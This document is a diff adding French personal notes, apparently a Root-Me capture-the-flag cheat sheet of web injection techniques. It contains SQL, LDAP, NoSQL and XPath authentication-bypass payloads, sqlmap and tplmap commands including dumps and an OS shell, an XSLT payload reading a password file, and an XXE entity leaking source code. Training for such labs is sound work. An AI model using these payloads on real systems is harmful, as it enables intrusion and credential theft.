@@ -1,0 +1,83 @@
+Pour les injection de en rapport avec Java on utiliser tplmap
+  -> https://github.com/epinna/tplmap
+  -> exemple : ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d "nickname=john"
+  -> ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d "nickname=john" --os-shell
+
+
+Pour les injections SQL
+  -> Exemple manuel :
+      -> ' OR 1=1 /*
+      -> ' OR 1=1 -- -
+      -> ' OR 1=1 #
+      -> ’ union select username,password from users ;
+      -> http://forum.sqliwiki.com/showthread.php?tid=30
+      -> &news_id=1 union select 666 ; UNION do not have the same number of result columns.. zut trop court
+      -> ,cast(( SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1 ) as numeric)
+      -> ,(cast(( SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0 ) as int))
+  -> On utilise SQLmap
+      -> sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbs
+      -> sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbms=SQLite --tables
+      -> sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbms=SQLite -D SQLite_masterdb -T users --dump
+      ->sqlmap --url 'http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search' --data 'login=%27+union+select+*--+' --dbms mysql --banner --tamper .sqlmap/tamper/encodehexa.py --time-sec 10 --level 5 --risk 3
+          A utiliser dans le cas de requete routed
+          Le —data indique les données à envoyer en POST. Dans ce payload, l’astérix (*) permet d’indiquer à SQLMAP ou réaliser l’injection.
+          Le —tamper est un script python qui permet l’encodage des payload SQLMAP en héxadécimal.
+          sqlmap ... -D c_webserveur_49 -T users --dump
+  -> Dans le cas ou on se recontre qu'il y a un systeme de taille maximale pour le champs users
+      Si on fait admin                   b et apres on mets notre password lors de l'inscription
+      si le champ login est trop long ca va delete les epsaces et replace le champs admin par le notre
+
+Injection XSLT
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+<xsl:value-of select="php:function('scandir')"/>
+<xsl:value-of select="php:function('opendir','.')"/>
+<br />
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
+
+</xsl:template>
+</xsl:stylesheet>
+
+Injection LDAP
+  -> Exemple      username=*
+                  password=*)(&
+  Allez sur https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+
+Injection NoSQL
+  ->Exemple login[$ne]=lol&pass[$ne]=lol   login[$regex]=a.*&pass[$ne]=lol
+
+  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+
+
+Injection XML / RSS
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php" >
+]>
+
+  <rss version="2.0">
+    <channel>
+        <title>Mon site</title>
+        <description>Ceci est un exemple de flux RSS 2.0</description>
+        <lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
+        <link>http://www.example.org</link>
+        <item>
+            <title>&xxe;</title>
+            <description>Ceci est ma première actualité</description>
+            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+            <link>http://www.example.org/actu1</link>
+        </item>
+        <item>
+            <title>Actualité N°2</title>
+            <description>Ceci est ma seconde actualité</description>
+            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
+            <link>http://www.example.org/actu2</link>
+        </item>
+    </channel>
+</rss>
+
+Injection XPath
+  Username:  John
+  Password: ' or '1'='1' and email='John@doe.org
